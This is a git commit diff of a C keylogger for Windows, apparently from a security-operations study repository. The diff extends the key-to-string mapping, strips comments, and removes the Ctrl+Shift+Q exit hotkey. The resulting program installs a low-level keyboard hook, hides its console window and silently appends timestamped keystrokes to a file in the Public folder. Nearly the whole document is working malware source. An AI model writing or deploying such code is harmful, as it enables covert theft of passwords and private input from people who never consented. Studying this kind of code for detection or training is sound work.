d80edaf5900e6e27113dc95e5422b3f5dfa5b9e9
tvp9999 <97007917+tvp9999@users.noreply.github.com>
2025-08-12 14:32:05 +0700

    Update and rename keylogger_windows.c to Keylogger_windows.c

--- VCS SOC/Keylogger_windows.c
+++ VCS SOC/Keylogger_windows.c
@@ -5,7 +5,6 @@
 HHOOK hHook;
 FILE *logFile;
 
-// Convert virtual key codes to human-readable strings
 const char* KeyToString(DWORD vkCode) {
     switch (vkCode) {
         case VK_BACK: return "[Backspace]";
@@ -21,18 +20,57 @@ const char* KeyToString(DWORD vkCode) {
         case VK_RIGHT: return "[Right]";
         case VK_UP: return "[Up]";
         case VK_DOWN: return "[Down]";
+        case VK_HOME: return "[Home]";
+        case VK_END: return "[End]";
+        case VK_PRIOR: return "[PageUp]";
+        case VK_NEXT: return "[PageDown]";
+        case VK_INSERT: return "[Insert]";
+        case VK_DELETE: return "[Delete]";
+        case VK_SNAPSHOT: return "[PrintScreen]";
+        case VK_SCROLL: return "[ScrollLock]";
+        case VK_PAUSE: return "[Pause]";
+
+        // F1–F12 keys
+        case VK_F1: return "[F1]";
+        case VK_F2: return "[F2]";
+        case VK_F3: return "[F3]";
+        case VK_F4: return "[F4]";
+        case VK_F5: return "[F5]";
+        case VK_F6: return "[F6]";
+        case VK_F7: return "[F7]";
+        case VK_F8: return "[F8]";
+        case VK_F9: return "[F9]";
+        case VK_F10: return "[F10]";
+        case VK_F11: return "[F11]";
+        case VK_F12: return "[F12]";
+
+        // Numpad keys
+        case VK_NUMPAD0: return "[Num0]";
+        case VK_NUMPAD1: return "[Num1]";
+        case VK_NUMPAD2: return "[Num2]";
+        case VK_NUMPAD3: return "[Num3]";
+        case VK_NUMPAD4: return "[Num4]";
+        case VK_NUMPAD5: return "[Num5]";
+        case VK_NUMPAD6: return "[Num6]";
+        case VK_NUMPAD7: return "[Num7]";
+        case VK_NUMPAD8: return "[Num8]";
+        case VK_NUMPAD9: return "[Num9]";
+        case VK_DECIMAL: return "[Num.]";
+        case VK_DIVIDE: return "[Num/]";
+        case VK_MULTIPLY: return "[Num*]";
+        case VK_SUBTRACT: return "[Num-]";
+        case VK_ADD: return "[Num+]";
+
         case VK_LWIN:
         case VK_RWIN: return "[Win]";
         default: return NULL;
     }
 }
 
-// Keyboard hook callback
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)lParam;
 
-        // Timestamp
         time_t now = time(NULL);
         struct tm *tstruct = localtime(&now);
         char timebuf[64];
@@ -47,8 +85,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             BYTE keyState[256];
             char buf[2] = {0};
             GetKeyboardState(keyState);
-
-            // Only log printable characters
             if (ToAscii(kbd->vkCode, kbd->scanCode, keyState, (LPWORD)buf, 0) == 1 && buf[0] >= 32) {
                 snprintf(logLine, sizeof(logLine), "%s%c\n", timebuf, buf[0]);
             } else {
@@ -64,32 +100,23 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main() {
-    // Open log file in Public directory
     logFile = fopen("C:\\Users\\Public\\keylog.txt", "a");
     if (!logFile) return 1;
 
-    // Install low-level keyboard hook
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
     if (!hHook) {
         fclose(logFile);
         return 1;
     }
 
-    // Hide console window
+    // Hide console
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
 
-    // Message loop with exit hotkey (Ctrl + Shift + Q)
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        if ((GetAsyncKeyState('Q') & 0x8000) &&
-            (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
-            (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
-            break;
-        }
-    }
+    while (GetMessage(&msg, NULL, 0, 0)) {}
 
-    // Cleanup
     UnhookWindowsHookEx(hHook);
     fclose(logFile);
     return 0;
